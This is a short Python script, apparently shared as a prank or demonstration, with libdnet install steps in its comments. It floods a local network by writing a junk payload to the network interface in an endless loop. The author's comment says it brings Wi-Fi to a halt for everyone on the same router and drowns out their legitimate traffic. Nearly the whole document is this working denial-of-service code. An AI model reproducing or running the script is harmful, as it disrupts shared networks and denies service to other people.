# brew install libdnet
# wget http://libdnet.googlecode.com/files/libdnet-1.12.tgz
# tar xfz libdnet-1.12.tgz
# ./configure
# make
# sudo make install
# cd python
# python setup.py install

import dnet

def bring_it_down(iface="en0", spam_packet='HOST:all|GET:spam'):
    datalink = dnet.eth(iface)
    h = datalink.get().encode('hex_codec')
    mac = ':'.join([h[i:i+2] for i in range(0, len(h), 2)])
    print 'Interface: %s\nMAC Address: %s\nPayload: %s' % (iface, mac, spam_packet)
    while True:
        datalink.send(spam_packet)



# BEWARE, RUNNING THIS WILL BRING YOUR ENTIRE LOCAL NETWORK TO A HALT, DO NOT RUN IT IF YOU'RE ON A SHARED CONNECTION
# what this does is write 'HOST:all|GET:spam' directly to your network interface as fast as it can, drowning out outer people's legitimate traffic
# I'm not sure if it's the interference at the physical layer, or if it's the router that gets hammered, either way, Wifi will slow to a halt for everyone connected to the same router.
if __name__ == "__main__":
    bring_it_down()
